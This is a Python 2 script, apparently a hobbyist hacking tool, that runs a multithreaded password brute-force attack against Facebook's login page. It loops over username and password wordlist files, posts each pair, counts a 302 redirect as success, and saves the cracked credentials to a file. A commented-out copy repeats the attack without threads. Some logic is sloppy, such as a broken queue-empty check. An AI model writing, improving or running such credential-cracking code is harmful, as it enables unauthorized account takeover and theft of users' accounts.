#/usr/bin python
# -*- coding: utf-8 -*-
'''
Created on 9 Mar, 2015

@author: wangyi
'''

import httplib,urllib,sys,os
import threading
import Queue
 
def info():
    pass
url = "www.facebook.com"#sys.argv[1]
url2= "https://www.facebook.com/login.php"#sys.argv[2]
info()
uname_count = len(open('uname.txt','rU').readlines())
print '你的账号条数：%d'%(uname_count)
pwd_count = len(open('pwd.txt','rU').readlines())
print '你的密码条数：%d'%(pwd_count)
print '正在破解........'
 
queue=Queue.Queue()#创建一个队列对象
 
success=[]
class ThreadUrl(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue=queue
    def run(self):
        while True:
            try:
                if(Queue.Empty):
                    pwd=self.queue.get()
                else:
                        break
                params = urllib.urlencode({'log':LOG, 'pwd':pwd})
                headers = {"Content-Type":"application/x-www-form-urlencoded", "Connection":"Keep-Alive"}
                conn = httplib.HTTPConnection(url)
                conn.request(method="POST",url=url2,body=params,headers=headers)
                response = conn.getresponse()
                if response.status == 302:
                    final="破解成功!^_^!账号：%s密码：%s"%(LOG,pwd)
                    print final
                    success.append(final)
                else:
                    conn.close()
            except:
                print '连接超时'
            self.queue.task_done()
 
def main():
    for i in range(10):
        t=ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
    names = [line.rstrip() for line in open("uname.txt")]
    pwds  = [line.rstrip() for line in open("pwd.txt")]
    for log in names: 
        global LOG
        LOG=''
        LOG=log
        for pwd in pwds:
            p=pwd
            queue.put(p)
        queue.join() 
if __name__ == '__main__':
    main()
    txt='%s.txt' % url
    with open(txt, 'w') as file:
        for x in success:
            file.write(x)
 
"""
names = [line.rstrip() for line in open("uname.txt")]
pwds = [line.rstrip() for line in open("pwd.txt")]
result=0
for log in names:
    if result==1:
        break
    for pwd in pwds:
        params = urllib.urlencode({'log':log,
                                  'pwd':pwd})
        headers = {"Content-Type":"application/x-www-form-urlencoded",     
                   "Connection":"Keep-Alive"}
        conn = httplib.HTTPConnection(url,80)
        conn.request(method="POST",url=url2,body=params,headers=headers)    
        response = conn.getresponse()     
        if response.status == 302:      
            print "破解成功!^_^!账号：%s密码：%s"%(log,pwd)  
            result=1
            break
        else:      
            print "破解失败\^0^/账号：%s密码：%s"%(log,pwd)           
        conn.close()"""
